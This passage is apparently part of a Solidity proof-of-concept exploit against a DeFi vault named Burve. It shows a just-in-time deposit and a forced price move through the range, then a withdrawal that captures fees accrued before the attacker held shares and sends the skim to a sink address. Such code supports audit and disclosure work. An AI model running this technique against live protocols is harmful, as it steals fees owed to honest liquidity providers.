        burve.mint(ALICE, 100_000e18, LO_LIMIT, HI_LIMIT);

        // fees earned by Burve's position while only honest LPs held shares
        stuckFees = 100e18;
        pool.accrueFees(address(burve), LO, HI, 0, uint128(stuckFees));
        t1.mint(address(pool), stuckFees);
        // pool price leaves the range downward: only token0 usable, token1 fees stuck
        pool.setPrice(SP_BELOW);
    }

    function run() external payable {
        // 1) JIT deposit while the range is still out of bounds (compound is gated).
        uint256 bobShares = burve.mint(address(this), 40_000e18, LO_LIMIT, HI_LIMIT);

        // fair (no-capture) value of bob's shares, valued at the withdraw price
        uint128 tNL0 = burve.totalNominalLiq();
        uint256 tS0 = burve.totalShares();
        uint128 fairLiq = uint128((bobShares * tNL0) / tS0);
        (, uint256 fairToken1) = LiquidityAmounts.getAmountsForLiquidity(
            SP_ABOVE, TickMath.getSqrtRatioAtTick(LO), TickMath.getSqrtRatioAtTick(HI), fairLiq, false
        );
        uint256 t1Before = t1.balanceOf(address(this));

        // 2) push the pool price up through the range (a large swap) -> re-entry.
        pool.setPrice(SP_ABOVE);

        // 3) withdraw: the withdraw-time compound now converts the previously-stuck
        //    fees into liquidity, inflating bob's redemption.
        burve.burn(bobShares, LO_LIMIT, HI_LIMIT);

        uint256 w1 = t1.balanceOf(address(this)) - t1Before;
        require(w1 > fairToken1, "no fee capture");
        skimmed = w1 - fairToken1;
        // attacker was NOT an LP while the fees accrued yet siphons >20% of them.
        require(skimmed > stuckFees / 5, "skim too small");

        // move exactly the stolen fees to the sink so measured profit == captured fees
        t1.transfer(SINK, skimmed);
    }
}
